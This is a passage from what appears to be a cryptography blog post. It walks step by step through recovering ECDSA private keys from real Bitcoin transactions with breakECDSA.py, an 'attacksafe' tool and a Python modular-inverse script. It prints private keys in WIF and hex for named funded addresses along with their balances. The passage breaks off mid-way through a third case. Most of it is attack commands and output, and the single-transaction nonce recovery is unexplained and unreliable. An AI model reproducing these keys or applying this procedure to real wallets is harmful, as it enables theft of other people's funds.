<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba" target="_blank" rel="noreferrer noopener"><strong>6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</strong></a>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba" target="_blank" rel="noreferrer noopener"><strong></strong></a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener">1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba">https://btc1.trezor.io/tx/6c857473097543b32702c5f731a3e4c5cb01a1a5ae4bcd1a297b5848acbe8aba</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-29-1024x135.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1609"></figure>



<pre class="wp-block-code"><code>RawTX = 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-30-1024x287.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1611"></figure>



<pre class="wp-block-code"><code>R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-31-1024x359.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1613"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-32-1024x491.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1614"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd

RawTX = 010000000183635783312a2792b673755da31df935ec22ff9916b4b43b4cefed644cb55a910b0000006b483045022100af4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f2602200a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562012102ae4a7601c546fef42deb70516d41645dc58613689754936efdd4850e186d8320ffffffff014e020000000000001976a914e94a23147d57674a7b817197be14877853590e6e88ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-33-1024x92.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1616"></figure>



<p><code>(0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26 , 0x61200da995a31b5be6f875decb954d0e3f8c54d16f7428827a2436cd2fce9419)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
point2gen  =   (0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26 , 0x61200da995a31b5be6f875decb954d0e3f8c54d16f7428827a2436cd2fce9419)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0xf39222231d8ddbaa7425e3c3ff4ebdc86aff1a5449df5910eae18baeb8d5bddd
R = 0xaf4133119bb32776d86b952d7c697f56cc0b12f7053eeb76de8e62d6c9e32f26
S = 0x0a9394acbcb515f16df5d2f94b970b3d9da0c91a7d372d62794f2234b40cd562
Z = 0xf3c7d4c7371a2c57be6b3eb6c446128a3a2cefdb593e6577750c95d22cd8309c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-34.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1618"></figure>



<p><code>PrivKey = 1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY
WIF:  Kx2mo3Efm5BaC45ozMVM4MPbcY6thbxVwgwXX8ByCuKRZeMmpATx
HEX:  1835e9d98626da85463bb917cda047b080432863778e97e2d5ffae35d0aefd80</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/001-2.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1688"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY">https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/001-addr.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1621"><figcaption class="wp-element-caption"><a href="https://www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY" target="_blank" rel="noreferrer noopener"><strong><code>www.blockchain.com/btc/address/1A1DUHhe6ENKxj4Qebs5Xs63pfWwRQazsY</code></strong></a></figcaption></figure>



<p><code>BALANCE: $ 607.79</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><strong><code>№2</code></strong></p>



<p>With detailed cryptanalysis, we also found a critical vulnerability in Bitcoin Address:</p>



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f">https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f</a></p>



<p><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6">https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></p>
</blockquote>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-2-1024x201.png" alt="WhiteBox Attack" class="wp-image-1527"></figure></div>

<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-3-1024x202.png" alt="WhiteBox Attack" class="wp-image-1529"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f">https://btc1.trezor.io/tx/ee10964f25b1888e63726faaf8b8d67779dccebdfdd9b45225fce54d0aa1b80f</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-35-1024x144.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1624"></figure>



<pre class="wp-block-code"><code>RawTX = 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-36-1024x303.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1626"></figure>



<pre class="wp-block-code"><code>R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>To get the secret key from a vulnerable ECDSA signing transaction, let’s add the data&nbsp;<code>RawTX</code>to a text document and save it as a file<code>RawTX.txt</code></p>



<pre class="wp-block-code"><code>01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Launch&nbsp;<code>-tool whitebox_attack</code>using software<code>“ATTACKSAFE SOFTWARE”</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>./attacksafe -tool whitebox_attack -open RawTX.txt -save SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-37-1024x264.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1628"></figure>



<p>We launched this attack from&nbsp;<code>-tool whitebox_attack</code>and the result was saved to a file<code>SecretKey.txt</code></p>



<p>Now to see the successful result, open the file<code>SecretKey.txt</code></p>



<pre class="wp-block-code"><code>cat SecretKey.txt</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-38-1024x374.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1630"></figure>



<pre class="wp-block-code"><code>Deployments ECDSA:

SecretKey = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e

RawTX = 01000000014398fe319f52d6b4cece666cb591ea22d1ea47dacd5df746e3aa588e5426a43c0d0000006b483045022100dd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc802206a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e4210301210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff0176020000000000001976a914212ae2b75df27ce3dfd0350335bc590d29d43bb188ac00000000</code></pre>



<p>We see an inscription&nbsp;<code>"Deployments ECDSA"</code>that means a critical vulnerability in the Bitcoin blockchain transaction.</p>



<p><code>SecretKey value in HEX format, this is our secret key "K" (NONCE):</code></p>



<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s check with a&nbsp;<em>Python</em>&nbsp;script<code>point2gen.py</code></h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://pypi.org/project/ECPy/" target="_blank" rel="noreferrer noopener"><strong>Let’s use the ECPy</strong></a>&nbsp;elliptic curve library&nbsp;:</p>



<p>Now let’s run the script by specifying&nbsp;<code>Secret Key "K" (NONCE)</code>:</p>



<pre class="wp-block-code"><code>python3 point2gen.py 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-39-1024x89.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1632"></figure>



<p><code>(0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8 , 0xfc8af5334a2b2742013063d05fcaef03a0c4b4bacabf6a7be849c1db87b5e265)</code></p>



<p>Checking the coordinates of a point&nbsp;<code>EC (secp256k1)&nbsp;</code>with a signature value<code>R</code></p>



<pre class="wp-block-code"><code>R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c</code></pre>



<hr class="wp-block-separator has-alpha-channel-opacity">



<pre class="wp-block-code"><code>R          =    0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
point2gen  =   (0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8 , 0xfc8af5334a2b2742013063d05fcaef03a0c4b4bacabf6a7be849c1db87b5e265)
</code></pre>



<p><code>ALL CORRECT!</code></p>



<p><code>K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e</code></p>



<p>Now knowing the secret key, we can get the private key to the Bitcoin Wallet:<code>12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Let’s use&nbsp; the&nbsp;<em>Python</em>&nbsp;script:&nbsp;&nbsp;<code>calculate.py</code>&nbsp;&gt; &gt; &gt; Get the Private Key</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>Let’s open the code and add all the value of the signatures<code><strong>K, R, S, Z</strong></code></p>



<pre class="wp-block-code"><code>def h(n):
    return hex(n).replace("0x","")

def extended_gcd(aa, bb):
    lastremainder, remainder = abs(aa), abs(bb)
    x, lastx, y, lasty = 0, 1, 1, 0
    while remainder:
        lastremainder, (quotient, remainder) = remainder, divmod(lastremainder, remainder)
        x, lastx = lastx - quotient*x, x
        y, lasty = lasty - quotient*y, y
    return lastremainder, lastx * (-1 if aa &lt; 0 else 1), lasty * (-1 if bb &lt; 0 else 1)

def modinv(a, m):
    g, x, y = extended_gcd(a, m)
    if g != 1:
        raise ValueError
    return x % m
    
N = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141


K = 0x39ec5220d3937da589231cbaa5b04002ce3b5689173680ee110ef81287f7867e
R = 0xdd0b22efd991dac497ce7223f5410d72aa88049482c5dca8a90def184afe5cc8
S = 0x6a2f72ca1d30a0ec392808142960cc4024bb84ce7f2f52288933124004e42103
Z = 0xe3836edb5789a3be19cb8b0c9bc8cb1ae2fd58c30d745ae34ceac35c20c0c21c


print (h((((S * K) - Z) * modinv(R,N)) % N))</code></pre>



<h2>The script will calculate the private key using the formula:</h2>



<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>



<p>Let’s run the script:</p>



<pre class="wp-block-code"><code>python3 calculate.py</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-40.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1634"></figure>



<p><code>PrivKey = 028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></p>



<p><strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">Let’s open bitaddress</a></strong>&nbsp;and&nbsp;check:</p>



<pre class="wp-block-code"><code>ADDR: 12bXHGbbWeqyixHpNjeSmq271ennbLRXh9
WIF:  KwJedezSt21uB3ZoHvzkWbcad4VLaJXu8467Jw58j47s4cseQJrk
HEX:  028a6a6f6ef174708aac8121c40e8545def4e73d5dd98f8a343f083a49fca03d</code></pre>


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/002-1.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1690"></figure></div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<p><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9">https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p><code>Private Key Found!</code></p>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-42-1024x465.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1638"><figcaption class="wp-element-caption"><strong><a href="https://www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener"><code>www.blockchain.com/btc/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</code></a></strong></figcaption></figure>



<p><code>BALANCE: $ 635.44</code></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><em>The potential threat of losing BTC coins lies in the critical vulnerability of the Bitcoin blockchain transaction, so we strongly recommend that everyone always update the software and use only verified devices.</em></p>
</blockquote>



<hr class="wp-block-separator has-alpha-channel-opacity">



<p>With detailed cryptanalysis, we also found a critical vulnerability in&nbsp;<strong><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6" target="_blank" rel="noreferrer noopener">f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></strong>&nbsp;for the same Bitcoin Address<strong><code>&nbsp;TXID:</code></strong><strong><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6" target="_blank" rel="noreferrer noopener"></a></strong></p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2>Prepare RawTX for the attack</h2>



<hr class="wp-block-separator has-alpha-channel-opacity">



<blockquote class="wp-block-quote">
<p><strong><a href="https://btc1.trezor.io/address/12bXHGbbWeqyixHpNjeSmq271ennbLRXh9" target="_blank" rel="noreferrer noopener">12bXHGbbWeqyixHpNjeSmq271ennbLRXh9</a></strong></p>



<p><a href="https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6">https://btc1.trezor.io/tx/f4a5275858cadcb6c2d2d605fcfe6b192560a2a18d9317c22bc37b77b6533ed6</a></p>
</blockquote>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-43-1024x140.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1641"></figure>



<pre class="wp-block-code"><code>RawTX = 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000
</code></pre>



<h2>Now we need to get all R, S, Z values ​​from all vulnerable transactions</h2>



<p>Let’s use the breakECDSA.py script</p>



<pre class="wp-block-code"><code>python2 breakECDSA.py 0100000001794e79fc042a7644cc4deb6e7858416dd8b898fe418b2894f8d3772ce8d132a0180000006a473044022048771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba502202756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be701210262c3a8791c0e44cd389ebe51c156b5aac490cddef3536638abf8863d55190adbffffffff010c03000000000000232103d68f90ba81455256cb7a0df14fb3930d6df61393207f2f3e71659414d296e0f0ac00000000
</code></pre>



<figure class="wp-block-image"><img decoding="async" src="./We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key - CRYPTO DEEP TECH_files/image-44-1024x216.png" alt="We implement WhiteBox Attack on Bitcoin with differential errors according to the research scheme of Eli Biham and Adi Shamir to extract the secret key" class="wp-image-1643"></figure>



<pre class="wp-block-code"><code>R = 0x48771a103dbc561b895d573a9b706b98f643701466de15980fa712b544554ba5
S = 0x2756e42292c841ccfef832138c52f66f7e03b7f2f86cf3fb4d7fd43d6a526be7
